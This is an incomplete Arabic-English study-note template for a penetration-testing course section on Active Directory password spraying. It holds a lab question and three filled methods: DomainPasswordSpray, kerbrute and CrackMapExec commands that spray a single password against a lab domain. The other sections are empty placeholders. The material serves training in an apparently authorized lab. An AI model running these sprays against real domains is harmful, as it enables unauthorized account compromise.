---
title: "اسم السكشن الكامل"
module: "Active Directory Enumeration & Attacks"
section_number: 12
tags:
  - CPTS
  - Active-Directory
  - Password-Spraying
  - Windows
difficulty: Medium
status: ✅ Complete
date: 2026-07-25
---

# 🎯 [MODULE-NAME] | SEC [NUM]: [Section Title]

---

## 📖 القسم الأول: شرح السكشن (عربي)

> [!info]- 🇮🇶 فهم الهدف والسياق (اضغط للفتح)
> **ليش هاي السكشن مهمة؟**
> ...شرح مفصل بالعربي...

> [!warning]- ⚠️ المفاهيم الأساسية اللازم تفهمها أولاً
> ...

> [!tip]- 🧠 استراتيجية التفكير والمنطق وراء الهجوم
> ...

---

## ❓ القسم الثاني: السؤال + ٦ طرق للحل

> [!abstract] 📌 السؤال الرسمي
> **Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.**

> [!example]- 🛠️ Method 1: DomainPasswordSpray.ps1 (PowerShell Native)
> ```powershell
> Import-Module .\DomainPasswordSpray.ps1
> Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_results.txt -ErrorAction SilentlyContinue
> ```
> **Result:** `...`

> [!example]- 🛠️ Method 2: Kerbrute (Go-based, Fast & Quiet)
> ```bash
> kerbrute passwordspray --dc 10.129.x.x -d INLANEFREIGHT.LOCAL users.txt 'Winter2022'
> ```

> [!example]- 🛠️ Method 3: CrackMapExec (SMB Protocol)
> ```bash
> crackmapexec smb 10.129.x.x -u users.txt -p Winter2022 --no-brute
> ```

> [!example]- 🛠️ Method 4: Invoke-SprayEmptyPassword (LDAP)
> ...

> [!example]- 🛠️ Method 5: Ruler (Exchange-based)
> ...

> [!example]- 🛠️ Method 6: Manual LDAP Query
> ...

---

## 📚 القسم الثالث: المصطلحات والمفاهيم

> [!note]- 🔤 Terminology — EN | AR
> | English Term | المصطلح بالعربي | الشرح |
> |---|---|---|
> | Password Spraying | رش كلمات المرور | هجوم... |
> | Domain Controller | وحدة التحكم بالدومين | السيرفر الرئيسي... |

> [!quote]- 💡 ملاحظات الدكتور الشخصية (Exam Tips)
> - ⚡ هاي الطريقة تشتغل لو...
> - 🚫 احذر من...